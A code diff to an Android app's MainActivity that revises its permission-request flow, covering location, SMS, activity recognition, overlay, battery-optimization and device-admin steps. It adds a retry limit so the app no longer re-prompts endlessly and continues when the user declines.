@@ -20,12 +20,13 @@ import android.widget.Toast;
 public class MainActivity extends Activity {
     private static final int REQ_PERMISSIONS = 100;
     private boolean serviceStarted = false;
+    private int permissionRetryCount = 0; // 【新增】防死循环重试计数
 
     // 步骤状态标志位
     private boolean waitingForBgLocSetting = false;
     private boolean waitingForBatterySetting = false;
     private boolean waitingForDeviceAdmin = false;
-    private boolean waitingForOverlaySetting = false; // 悬浮窗权限
+    private boolean waitingForOverlaySetting = false;
 
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
 
@@ -43,7 +44,6 @@ public class MainActivity extends Activity {
     protected void onResume() {
         super.onResume();
 
-        // 1. 从“设备管理器”页面返回
         if (waitingForDeviceAdmin) {
             waitingForDeviceAdmin = false;
             android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -58,36 +58,32 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // 2. 从“悬浮窗权限”页面返回
         if (waitingForOverlaySetting) {
             waitingForOverlaySetting = false;
             if (Settings.canDrawOverlays(this)) {
                 Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
             }
-            checkDeviceAdmin(); // 继续检查设备管理器
+            checkDeviceAdmin(); 
             return;
         }
 
-        // 3. 从“电池优化”页面返回
         if (waitingForBatterySetting) {
             waitingForBatterySetting = false;
             if (isBatteryOptimizationIgnored()) {
                 Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
-                checkOverlayPermission(); // 去检查悬浮窗
+                checkOverlayPermission(); 
             } else {
                 promptBatteryOptimizationAgain();
             }
             return;
         }
 
-        // 4. 从“应用详情页(后台定位)”返回
         if (waitingForBgLocSetting) {
             waitingForBgLocSetting = false;
             proceedAfterBackgroundLocation();
             return;
         }
 
-        // 5. 正常启动流程
         checkAndRequestPermissions();
     }
 
@@ -99,7 +95,6 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // 检查精确闹钟权限 (Android 12+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
             if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
@@ -116,7 +111,6 @@ public class MainActivity extends Activity {
             }
         }
 
-        // 检查常规权限（加入身体活动权限）
         boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
         boolean needBgLoc = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;
         boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
@@ -125,7 +119,12 @@ public class MainActivity extends Activity {
         boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
 
         if (needFgLoc || needNotif || needSms || needActivity) {
-            // 注意：身体活动权限一定要包含在里面
+            if (permissionRetryCount >= 2) {
+                // 如果重试超过 2 次，直接跳过，防止死循环
+                proceedAfterPermissions();
+                return;
+            }
+            permissionRetryCount++;
             requestPermissions(new String[]{
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.ACCESS_COARSE_LOCATION,
@@ -162,12 +161,23 @@ public class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_PERMISSIONS) checkAndRequestPermissions();
+        if (requestCode == REQ_PERMISSIONS) {
+            // 只要回调了，不马上重试，而是判断当前状态
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                // 成功给了一个，重置计数，继续查下一个
+                permissionRetryCount = 0;
+                checkAndRequestPermissions();
+            } else {
+                // 用户拒绝了，继续走流程（防止死循环）
+                Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
+                proceedAfterPermissions();
+            }
+        }
     }
 
     private void proceedAfterPermissions() {
         if (isBatteryOptimizationIgnored()) {
-            checkOverlayPermission(); // 电池OK，去检查悬浮窗
+            checkOverlayPermission();
         } else {
             promptBatteryOptimization();
         }
@@ -227,13 +237,13 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ==================== 步骤三：悬浮窗权限（新增） ====================
+    // ==================== 步骤三：悬浮窗权限 ====================
 
     private void checkOverlayPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             new AlertDialog.Builder(this)
                     .setTitle("开启悬浮窗权限")
-                    .setMessage("用于提升后台存活率，请在下一页允许「显示在其他应用上层」。")
+                    .setMessage("用于提升后台存活率和显示提示，请在下一页允许「显示在其他应用上层」。")
                     .setCancelable(false)
                     .setPositiveButton("去开启", (dialog, which) -> {
                         waitingForOverlaySetting = true;
